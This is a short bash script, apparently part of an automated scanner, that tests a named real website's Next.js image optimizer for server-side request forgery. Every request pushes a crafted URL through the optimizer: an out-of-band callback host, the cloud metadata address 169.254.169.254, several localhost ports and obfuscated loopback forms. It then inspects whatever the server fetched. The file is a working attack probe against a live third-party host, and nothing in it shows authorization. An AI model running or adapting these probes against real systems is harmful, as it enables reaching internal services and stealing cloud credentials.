#!/bin/bash
D=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
H="https://www.infinitycapital.bh"
IMG="oob0289e98fc279.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }
g(){ # $1 = raw url to fetch through optimizer
  local u="$1"; local lbl="$2"
  printf "%-28s " "$lbl"
  curl -s -m 40 --http1.1 -A "$UA" -H 'Accept: image/avif,image/webp,*/*' \
    -o $D/tool_outputs/p7img.bin -w "%{http_code} %{size_download} %{content_type}\n" \
    "$H/_next/image?url=$(enc "$u")&w=1080&q=75"
}
g "http://$IMG/ssrf-probe-a.png" "oob-http-abs"
g "https://$IMG/ssrf-probe-b.png" "oob-https-abs"
g "//$IMG/ssrf-probe-c.png"  "oob-protocol-rel"
g "http://169.254.169.254/latest/meta-data/" "cloud-metadata"
g "http://127.0.0.1:3000/" "localhost-3000"
g "http://localhost:8080/" "localhost-8080"
g "http://[::1]:3000/" "ipv6-localhost"
g "http://2130706433/" "decimal-loopback"
echo "--- next.config remotePatterns probe: try non-ctfassets hosts ---"
g "http://example.com/x.png" "example-com"
g "http://www.infinitycapital.bh/robots.txt" "self-robots"
g "http://localhost:22/" "port22"
echo "--- what did oob fetch return (content-type) ---"
file $D/tool_outputs/p7img.bin 2>/dev/null; head -c 200 $D/tool_outputs/p7img.bin | xxd | head -5
